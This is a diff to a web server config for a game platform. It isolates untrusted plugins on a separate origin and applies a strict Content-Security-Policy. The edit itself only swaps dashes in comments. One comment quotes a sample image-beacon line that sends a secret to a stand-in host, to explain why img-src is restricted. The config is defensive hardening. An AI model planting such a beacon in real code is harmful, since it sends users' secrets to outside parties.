@@ -9,7 +9,7 @@ doot.games {
 # Untrusted-plugin origin. A deliberately SEPARATE ORIGIN from doot.games so a
 # sandboxed plugin lands on a cookieless, session-less host (the Sandpack/itch.io
 # lesson; see docs/external-plugins.md + docs/plugin-authoring-roadmap.md). This
-# is safe as a subdomain only because Doot's auth cookies are host-only — never
+# is safe as a subdomain only because Doot's auth cookies are host-only - never
 # set a `.doot.games` cookie or enable better-auth crossSubDomainCookies.
 #
 # It is static ONLY and MUST NOT reverse_proxy to `app` (which holds the session,
@@ -23,7 +23,7 @@ plugins.doot.games {
 		# connect-src 'none' blocks fetch/XHR/WebSocket. But it is NOT "can't
 		# exfiltrate" on its own: any allowed remote img-src is a beacon channel
 		# (new Image().src = 'https://host/?d=' + secret). So img-src is 'self'
-		# + data: only — platform media is handed to the plugin over the bridge,
+		# + data: only - platform media is handed to the plugin over the bridge,
 		# never as a fetchable URL the plugin builds. frame-ancestors lets only
 		# Doot embed it. Reviewed plugins may later widen connect-src per manifest.
 		Content-Security-Policy "default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'none'; frame-ancestors https://doot.games; base-uri 'none'; form-action 'none'"
@@ -37,5 +37,5 @@ plugins.doot.games {
 		Referrer-Policy "no-referrer"
 		-Server
 	}
-	respond "Doot plugin origin — untrusted game plugins run sandboxed here. See https://doot.games" 200
+	respond "Doot plugin origin - untrusted game plugins run sandboxed here. See https://doot.games" 200
 }
